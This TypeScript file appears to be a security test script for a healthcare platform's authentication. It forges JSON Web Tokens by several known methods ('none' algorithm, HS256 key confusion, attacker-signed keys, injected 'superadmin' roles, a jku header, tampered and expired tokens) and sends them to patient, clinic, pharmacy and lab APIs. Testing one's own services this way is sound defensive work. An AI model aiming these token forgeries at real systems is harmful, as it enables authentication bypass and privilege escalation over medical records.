import { createHmac, createSign, generateKeyPairSync } from 'node:crypto';
import { PASSPORT, KIOREX_API, KIORLY_API, PHARMACY_API, LAB_API, PATIENT_1 } from '../src/env.js';
import { patientLogin, kiorex } from '../src/clients.js';
import { decodeJwt } from '../src/passport.js';
const b64 = (o: any) => Buffer.from(typeof o === 'string' ? o : JSON.stringify(o)).toString('base64url');
const l = await patientLogin(PATIENT_1);
const [h, p] = l.accessToken.split('.');
const hdr = JSON.parse(Buffer.from(h, 'base64url').toString()); const pl = decodeJwt(l.accessToken);
console.log('header', hdr, 'claims', Object.keys(pl).join(','));
const jwks: any = await (await fetch(`${PASSPORT}/jwks`)).json().catch(() => null);
const forged: Record<string, string> = {};
forged.none = `${b64({ alg: 'none', typ: 'JWT' })}.${b64(pl)}.`;
forged.noneUpper = `${b64({ alg: 'None', typ: 'JWT' })}.${b64(pl)}.`;
forged.hs256_pubkey = `${b64({ alg: 'HS256', typ: 'JWT', kid: hdr.kid })}.${b64(pl)}.` + createHmac('sha256', JSON.stringify(jwks)).update(`${b64({ alg: 'HS256', typ: 'JWT', kid: hdr.kid })}.${b64(pl)}`).digest('base64url');
const { privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
const sign = (hh: any, pp: any) => { const s = createSign('RSA-SHA256'); const i = `${b64(hh)}.${b64(pp)}`; s.update(i); return `${i}.${s.sign(privateKey).toString('base64url')}`; };
forged.attackerKey = sign({ alg: 'RS256', typ: 'JWT', kid: hdr.kid }, pl);
forged.attackerKeyOps = sign({ alg: 'RS256', typ: 'JWT', kid: hdr.kid }, { ...pl, kx_roles: ['superadmin', 'ops'] });
forged.jkuHdr = sign({ alg: 'RS256', typ: 'JWT', kid: 'x', jku: 'http://127.0.0.1:9/jwks' }, pl);
forged.wrongAud = l.accessToken; // placeholder
forged.tamperedPayload = `${h}.${b64({ ...pl, kx_roles: ['superadmin'] })}.${l.accessToken.split('.')[2]}`;
forged.expired = `${h}.${b64({ ...pl, exp: pl.exp - 99999, iat: pl.iat - 99999 })}.${l.accessToken.split('.')[2]}`;
for (const [k, t] of Object.entries(forged)) {
  if (k === 'wrongAud') continue;
  const r1 = await kiorex(t, 'GET', '/auth/me');
  const r2 = await fetch(`${KIORLY_API}/auth/me`, { headers: { authorization: `Bearer ${t}` } });
  const r3 = await fetch(`${PHARMACY_API}/auth/me`, { headers: { authorization: `Bearer ${t}` } });
  const r4 = await fetch(`${LAB_API}/auth/me`, { headers: { authorization: `Bearer ${t}` } });
  console.log(k.padEnd(18), 'kiorex', r1.status, 'clinic', r2.status, 'pharm', r3.status, 'lab', r4.status);
}
// valid patient token on other APIs (audience separation)
for (const [n, u] of Object.entries({ clinic: KIORLY_API, pharm: PHARMACY_API, lab: LAB_API })) { const r = await fetch(`${u}/auth/me`, { headers: { authorization: `Bearer ${l.accessToken}` } }); console.log('valid patient token on', n, r.status, (await r.text()).slice(0,120)); }
